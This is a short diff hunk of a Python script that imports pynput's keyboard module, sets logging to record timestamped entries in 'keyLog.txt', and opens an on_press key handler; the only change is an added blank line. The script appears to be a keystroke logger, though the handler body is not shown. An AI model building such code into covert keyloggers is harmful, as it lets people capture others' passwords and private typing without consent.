@@ -5,6 +5,7 @@ import pynput.keyboard as KeyBoard
 import logging
 from multiprocessing import Process
 import threading
+
 logging.basicConfig(filename = ("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
